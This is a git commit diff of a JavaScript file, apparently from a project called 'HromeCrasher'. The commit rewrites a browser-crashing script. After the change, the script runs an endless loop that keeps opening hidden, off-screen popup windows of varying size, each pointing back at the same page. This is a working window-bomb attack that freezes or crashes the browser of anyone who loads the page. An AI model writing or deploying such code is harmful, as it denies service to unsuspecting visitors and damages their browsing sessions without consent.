ba6199d6e806a74bcde8f6d0a845a39f856d5bb8
Lexa <86785362+Lexa526@users.noreply.github.com>
2022-04-23 16:21:26 +0300

    Add files via upload

--- js.js
+++ js.js
@@ -1,18 +1,21 @@
-let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
-width=100,height=100,left=-1000,top=-1000`;
-
-
 let da = 1
-  while (1>0) {
+let height = 50
+  while (true) {
     da = da + 1
-    console.log(da)
-    open('https://lexa526.github.io/HromeCrasher/', da, params);
+    for (let width = 50; width <= 1600; width++) {
+      if (height<=900) {
+        height++
+      }
+      params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
+      width=${width},height=${height},left=-1000,top=-1000`;
+      open('https://lexa526.github.io/HromeCrasher/', da, params);
+    }
+    for (let width = 1600; width >= 50; width--) {
+      if (height>=50) {
+        height--
+      }
+      params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
+      width=${width},height=${height},left=-1000,top=-1000`;
+      open('https://lexa526.github.io/HromeCrasher/', da, params);
+    }
   }
-let crush = document.querySelector(".crush1");
-crush.addEventListener("click", (e) => {
-  while (1>0) {
-    da = da + da * da **
-    console.log(da)
-    open('https://lexa526.github.io/HromeCrasher/', da, params);
-  }
-});
